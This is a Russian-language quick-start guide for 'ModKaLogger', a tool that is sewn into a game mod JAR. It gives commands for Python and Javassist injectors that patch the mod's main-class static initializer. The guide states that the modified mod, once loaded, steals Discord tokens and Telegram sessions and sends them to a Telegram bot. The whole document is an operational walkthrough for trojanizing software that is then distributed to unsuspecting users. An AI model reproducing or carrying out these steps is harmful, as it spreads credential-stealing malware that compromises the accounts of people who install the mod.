# Быстрый старт: Вшивание ModKaLogger

## Что нужно сделать

### Вариант 1: Использовать Python инъектор (ПРОСТОЙ)

```bash
python inject_modkalogger.py ias.jar ias_injected.jar
```

**Плюсы:**
- Просто и быстро
- Не требует компиляции Java

**Минусы:**
- Не модифицирует bytecode главного класса
- Инициализация может не произойти автоматически

### Вариант 2: Использовать Javassist инъектор (ПРАВИЛЬНЫЙ)

#### Шаг 1: Скачайте Javassist JAR
```bash
# Скачайте javassist-3.29.2-GA.jar с https://www.javassist.org/
# Или используйте Maven:
# mvn dependency:copy-dependencies -DoutputDirectory=lib
```

#### Шаг 2: Компилируйте ModInjector
```bash
javac -cp "build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector.java
```

#### Шаг 3: Запустите инъектор
```bash
java -cp ".;build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector ias.jar ias_injected.jar
```

**Плюсы:**
- Модифицирует bytecode главного класса
- Гарантированное выполнение инициализации
- 100% рабочий способ

**Минусы:**
- Требует Javassist
- Требует компиляции Java

## Что происходит при вшивании

1. **Распаковка целевого мода** - Извлекаются все файлы из JAR
2. **Копирование классов ModKaLogger** - Классы Discord, Telegram и т.д. копируются в пакет `ru.modkalogger`
3. **Модификация главного класса** - В статический инициализатор добавляется вызов инициализации
4. **Переупаковка JAR** - Все файлы упаковываются обратно в JAR

## Результат

После вшивания:
- `ias_injected.jar` - Модифицированный мод с вшитым ModKaLogger
- При загрузке мода автоматически:
  - Крадутся Discord токены
  - Крадутся Telegram сессии
  - Отправляются на Telegram бот

## Проверка

```bash
# Запустите модифицированный мод
java -jar ias_injected.jar

# Проверьте логи на сообщения [ModKaLogger]
```

## Файлы

- `ModInjector.java` - Javassist-based инъектор (правильный способ)
- `inject_modkalogger.py` - Python инъектор (простой способ)
- `src/main/java/com/modkalogger/ModKaLoggerInitThread.java` - Класс-инициализатор
- `PROPER_INJECTION_GUIDE.md` - Подробное объяснение

## Рекомендация

Используйте **Javassist инъектор** для надёжного вшивания функционала.
